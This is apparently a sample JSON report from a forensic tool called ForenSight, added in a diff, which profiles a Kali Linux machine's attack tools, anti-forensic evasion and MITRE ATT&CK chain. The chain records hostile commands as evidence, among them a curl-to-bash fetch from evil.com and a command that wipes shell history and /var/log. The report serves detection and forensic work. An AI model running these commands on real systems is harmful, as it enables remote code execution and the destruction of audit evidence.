@@ -1,0 +1,60 @@
+{
+  "scan_meta": {
+    "tool": "ForenSight",
+    "version": "1.0.0",
+    "scan_time": "2026-03-16T02:11:00Z",
+    "target": "live_system"
+  },
+  "os_profile": {
+    "distro": "Kali Linux",
+    "version": "2023.4",
+    "confidence": 0.94,
+    "evidence": ["Found /etc/kali-release", "offensive tools pre-installed"]
+  },
+  "tools_detected": [
+    {
+      "name": "nmap",
+      "category": "recon",
+      "state": "removed",
+      "evidence": "inode ghost in /usr/bin, library residue in /var/cache"
+    },
+    {
+      "name": "metasploit",
+      "category": "exploit",
+      "state": "installed",
+      "evidence": "found in /opt/metasploit-framework"
+    }
+  ],
+  "evasion_score": 91,
+  "evasion_breakdown": {
+    "log_wipe": 30,
+    "history_clear": 20,
+    "timestamp_manipulation": 25,
+    "anti_forensic_tools": 16
+  },
+  "persona": "Data Exfiltrator",
+  "persona_confidence": 0.87,
+  "temporal_paradoxes": [
+    {
+      "type": "mtime_exceeds_ctime",
+      "file": "/etc/passwd",
+      "mtime": "2026-03-10T14:22:00Z",
+      "ctime": "2026-03-09T08:00:00Z",
+      "severity": "critical"
+    }
+  ],
+  "mitre_chain": [
+    { "phase": "Recon",      "technique": "T1046", "command": "nmap -sV 192.168.1.0/24", "timestamp": "2026-03-16T02:11:00Z" },
+    { "phase": "Execution",  "technique": "T1059", "command": "curl http://evil.com/payload.sh | bash", "timestamp": "2026-03-16T02:19:00Z" },
+    { "phase": "Persistence","technique": "T1053", "command": "crontab -e", "timestamp": "2026-03-16T02:22:00Z" },
+    { "phase": "Cover Tracks","technique": "T1070", "command": "history -c && rm -rf /var/log/*", "timestamp": "2026-03-16T02:25:00Z" }
+  ],
+  "uefi": {
+    "usb_boot_signature": true,
+    "last_boot_device": "USB",
+    "boot_entries": ["Tails 6.0", "Ubuntu"],
+    "firmware_evidence": "USB boot signature burned 3 weeks prior"
+  },
+  "narrative": "This machine shows strong indicators of a structured attack campaign. An offensive Linux distribution was detected alongside multiple reconnaissance and exploitation tools. Evidence of deliberate evidence destruction was found — bash history was cleared, logs were wiped, and filesystem timestamps were manipulated. The attacker persona matches a Data Exfiltrator profile. Evasion intent score: 91/100.",
+  "verdict": "HIGH RISK — structured attack campaign detected. Evidence tampering confirmed."
+}
